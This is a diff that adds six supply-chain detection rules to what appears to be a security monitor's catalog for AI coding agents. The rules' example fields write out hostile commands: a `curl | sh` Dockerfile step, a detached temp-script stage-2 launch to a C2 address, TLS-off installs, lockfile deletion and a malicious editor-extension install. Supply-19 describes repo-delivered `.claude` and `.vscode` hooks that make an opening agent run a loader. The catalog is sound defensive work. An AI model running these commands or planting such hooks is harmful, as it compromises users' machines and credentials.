@@ -303,6 +303,143 @@ setup.py|npm run|yarn run`: toolchain children (`cc|gcc|ld|rustc|javac|node|tsc`
 overlap on the download half, but no rule today keys on build-tool ancestry
 or distinguishes toolchain children.
 
+### SC supply-14 Lockfile discarded or bypassed before an install
+- category: supply-chain
+- decision: approval_required | severity: 3
+- pack: process | coverage: gap
+- observable: exec-input
+- sources: supply-mastra-easy-day-js-typosquat, supply-solana-web3js-backdoor
+behavior: The lockfile is the only record of the exact versions the project
+was last known-good with, and the Mastra wave exploited precisely the moment
+it does not exist: `easy-day-js` rode in as `^1.11.21`, a range that resolved
+to the malicious `1.11.22` at install time. An agent that deletes a lockfile
+to "regenerate it cleanly", installs with `--no-package-lock`, or re-resolves
+the whole tree re-opens every range to whatever the registry serves at that
+minute — which during an active wave is the poisoned release. Pinning to
+known-good versions was also the standard remediation for solana-web3.js and
+chalk/debug; discarding the pin undoes it.
+example: `rm package-lock.json && npm install` ; `npm install --no-package-lock` ; `cargo update` (whole-tree re-resolution) ; `rm -f uv.lock && uv sync`
+signal: `exec` of `rm|sh|bash|git` whose argv deletes or truncates a lockfile
+(`package-lock.json|npm-shrinkwrap.json|yarn.lock|pnpm-lock.yaml|Cargo.lock|poetry.lock|uv.lock|go.sum|composer.lock|Gemfile.lock`)
+from agent ancestry, followed within the session by an install exec in the
+same project → `approval_required`; also `exec` of `npm|yarn` install with
+`--no-package-lock|--no-shrinkwrap|--no-lockfile`, or `cargo update` with no
+package argument. Pure argv matching; fires today.
+
+### SC supply-15 Interpreter executed on a freshly written temp script
+- category: supply-chain
+- decision: approval_required | severity: 4
+- pack: cross | coverage: gap
+- observable: exec-input
+- sources: supply-mastra-easy-day-js-typosquat, evade-pypi-secretslib-fileless-miner, supply-keyv-preinstall-provenance
+behavior: The standard npm-wave payload is a lifecycle hook that fetches a
+second stage into a scratch directory and runs it through the interpreter.
+Mastra's `setup.cjs` wrote a random-named `.js` to the temp dir and spawned
+`node <tmp>/<24-hex>.js` detached; the keyv loader launched the 727 KB
+`Math_Symbol.js` the same way. `process.exec.from-temp` matches the exe path
+only — a script argument never appears there because the interpreter binary
+lives in `/usr/bin`. Nothing today notices `node /tmp/x.js` or
+`python3 /tmp/.x.py`, with or without install ancestry, yet no development
+workflow runs scripts from world-scratch directories.
+example: `npm install` → postinstall `node setup.cjs` → spawn `node /tmp/f3a9b2…c1.js 23.254.164.123:443` (detached) ; `sh -c 'python3 /var/tmp/.x.py'`
+signal: `exec` of `node|python3|python|perl|ruby` where an argv element is a
+script path under `/tmp|/var/tmp|/dev/shm` → `approval_required`; escalate
+to `deny` when the ancestry root is a package-manager install command, or
+the same path received a `file_open` (write) earlier in the session
+(drop-then-run across two observables). The exec+argv half fires today; the
+write correlation needs `file_open`.
+
+### SC supply-16 Container image build as an out-of-reach build script
+- category: supply-chain
+- decision: approval_required | severity: 3
+- pack: process | coverage: gap
+- observable: file-open
+- sources: supply-xz-build-backdoor
+behavior: `docker build` runs every `RUN` line of a Dockerfile — npm
+installs with their postinstall hooks, `curl | bash`, compilers — inside
+BuildKit containers managed by the daemon. Those steps are not descendants
+of the `docker` CLI the monitor traces, so the build executes
+manifest-driven code beyond observability: the monitor sees `docker build .`
+and nothing of what it did. An agent that writes or edits a Dockerfile and
+then builds it has authored an executable manifest and run it where the
+firewall is blind — the same class of risk xz posed from `configure`, one
+layer further removed from view.
+example: agent writes `Dockerfile` containing `RUN curl -fsSL https://example.com/x.sh | sh`, then runs `docker build -t app .` ; `docker compose build` with a session-written `compose.yaml` overriding `command:`
+signal: `file_open` (write) of
+`Dockerfile|Containerfile|*.dockerfile|compose.y*ml|docker-compose.y*ml`
+from agent ancestry, followed within the session by `exec` of
+`docker|podman|buildah|nerdctl` with `build|bud` or `compose build` →
+`approval_required`. The gate fundamentally needs the file-open half; the
+build exec alone is visible today and worth a report-grade rule meanwhile.
+
+### SC supply-17 Transport verification disabled for fetches
+- category: supply-chain
+- decision: approval_required | severity: 3
+- pack: network | coverage: gap
+- observable: exec-input
+- sources: supply-mastra-easy-day-js-typosquat
+behavior: Mastra's dropper set `NODE_TLS_REJECT_UNAUTHORIZED=0` in-process
+so its self-signed C2 would not break the stage-2 download, and every child
+it spawned inherited the switch in its environment. The same downgrade has
+command-line forms an agent may be talked into: `curl -k`, `wget
+--no-check-certificate`, `pip install --trusted-host`, `npm config set
+strict-ssl false`, `git config http.sslVerify false`. With verification off,
+any on-path observer becomes the package source — the MITM half of every
+typosquat wave. The pack already gates `curl | bash` and
+`StrictHostKeyChecking=no`; nothing covers TLS-off package fetches.
+example: `NODE_TLS_REJECT_UNAUTHORIZED=0 npm install` ; `npm config set strict-ssl false` ; `pip install --trusted-host pypi.example.simple pkg` ; `git config http.sslVerify false && git clone https://…`
+signal: `exec` where the environment contains
+`NODE_TLS_REJECT_UNAUTHORIZED=0` or `SSL_CERT_FILE|SSL_CERT_DIR` pointing
+outside the system store, or argv matches
+`-k|--insecure|wget --no-check-certificate|npm config set (strict-ssl|cafile)|--trusted-host|git config http.sslVerify false`
+from agent ancestry → `approval_required`. Env and argv are both exec
+observables; fires today.
+
+### SC supply-18 Editor extension installed from agent ancestry
+- category: supply-chain
+- decision: approval_required | severity: 3
+- pack: process | coverage: gap
+- observable: exec-input
+- sources: exfil-glassworm-openvsx, mcp-glassworm-watercrawl
+behavior: Editor extensions are packages that execute in-process with the
+user's privileges, and GlassWorm showed the marketplace is a supply chain
+like any other: a malicious Open VSX extension harvested credentials and
+moved them over blockchain-driven egress, and a later wave delivered
+invisible-code malware in a fake MCP-server extension. An agent "installing
+the extension the README mentioned" runs the same code path — the ad-hoc
+install gate (SC 5) covers `npx`/`pipx` but not the editor CLI, which
+fetches and activates whatever the registry serves with no manifest review
+at all.
+example: `code --install-extension attacker.ext --force` ; `cursor --install-extension publisher.helper` ; `codium --install-extension x.y`
+signal: `exec` of a VS Code-family CLI (`code|code-insiders|codium|code-server|cursor|windsurf`) with argv `--install-extension` (or
+`--uninstall-extension`) from agent ancestry → `approval_required`. Plain
+argv check on program+flag; fires today. `--force` strengthens the match.
+
+### SC supply-19 Repo-delivered agent or IDE config registering execution hooks
+- category: supply-chain
+- decision: approval_required | severity: 4
+- pack: cross | coverage: gap
+- observable: exec-input
+- sources: supply-keyv-preinstall-provenance, inject-cursor-rules-backdoor
+behavior: The keyv attacker's second execution path needed no install at
+all: the compromised repository received a commit adding `.claude/settings.json`
+with a `SessionStart` hook invoking `.vscode/setup.mjs`, and
+`.vscode/tasks.json` with `runOn: "folderOpen"` invoking `.claude/setup.mjs`.
+The next person — or coding agent — who opens the checkout executes the
+loader under the project's trust; for a monitored agent the hook runs as a
+child of the sanctioned session itself. `process.agent.guardrail-config`
+gates permission edits to `.claude/settings.local.json`, and the rules-file
+catalog covers instruction injection; no rule gates hook-bearing config
+arriving from a clone or the interpreter exec it launches.
+example: `git clone https://github.com/victim/repo && claude` → SessionStart hook → `node .vscode/setup.mjs` ; VS Code runs the `folderOpen` task on open → `.claude/setup.mjs`
+signal: `exec` of `node|python3|sh|bash` whose argv script path falls under
+the project's `.claude/` or `.vscode/` tree, where the ancestry contains the
+sanctioned agent → `approval_required`; plus `file_open` (write) of
+`.claude/settings.json|.claude/*.mjs|.vscode/tasks.json|.vscode/*.mjs` from
+agent ancestry including `git` children, so a clone delivering the files is
+recorded. The exec half fires today; the clone-delivery half needs
+`file_open`.
+
 ---
 
 ## Coverage summary
